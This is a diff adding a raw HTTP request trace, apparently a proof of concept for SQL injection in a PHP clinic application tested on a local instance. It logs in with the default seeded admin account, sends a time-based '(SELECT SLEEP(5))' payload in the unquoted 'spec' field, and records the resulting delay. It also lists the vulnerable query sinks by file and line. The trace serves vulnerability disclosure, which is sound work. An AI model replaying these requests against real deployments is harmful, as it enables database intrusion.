@@ -1,0 +1,45 @@
+Raw request trace (decoded payloads) - local isolated instance, MySQL 8.0.39 / PHP 8.4.26.
+
+# --- Login with the seeded default administrator account ---------------------
+POST /login.php HTTP/1.1
+Host: target.local
+Content-Type: application/x-www-form-urlencoded
+
+useremail=admin%40edoc.com&userpassword=<REDACTED>
+# password = shipped seed value (redacted; see seed dump reference below)
+
+-> HTTP 302 Location: admin/index.php (seed: SQL_Database_edoc.sql lines 42-43); keep PHPSESSID
+
+# --- Baseline: benign spec=1 --------------------------------------------------
+POST /admin/add-new.php HTTP/1.1
+Host: target.local
+Cookie: PHPSESSID=<admin session>
+Content-Type: application/x-www-form-urlencoded
+
+name=DocBase&nic=111&spec=1&email=docbase@test.local&Tele=555&password=pw1&cpassword=pw1
+
+-> HTTP 302 in 0.034 s; doctor row stored with specialties=1
+
+# --- Payload: spec injected unquoted (decodes to: (SELECT SLEEP(5))) ---------
+POST /admin/add-new.php HTTP/1.1
+Host: target.local
+Cookie: PHPSESSID=<admin session>
+Content-Type: application/x-www-form-urlencoded
+
+name=DocInj&nic=222&spec=%28SELECT%20SLEEP%285%29%29&email=docinj@test.local&Tele=556&password=pw2&cpassword=pw2
+
+-> HTTP 302 in 5.051 s
+   Sink 2: admin/add-new.php:59/61 - $spec concatenated WITHOUT quotes into
+   insert into doctor(docemail,docname,docpassword,docnic,doctel,specialties)
+   values('$email','$name','$password','$nic','$tele',$spec);
+   Sink 3: admin/add-new.php:60/62 - insert into webuser values('$email','d')
+
+# --- DB proof (harmless stored-value evidence) -------------------------------
+SELECT docemail, specialties FROM doctor
+ WHERE docemail IN ('docbase@test.local','docinj@test.local');
+-> docbase@test.local | 1
+   docinj@test.local  | 0   <- SLEEP(5) return value stored in specialties
+
+# Note: sink 1 - the duplicate-check SELECT at admin/add-new.php:54 interpolates
+# $email ("select * from webuser where email='$email';") and is additionally
+# injectable (boolean oracle; not separately demonstrated).
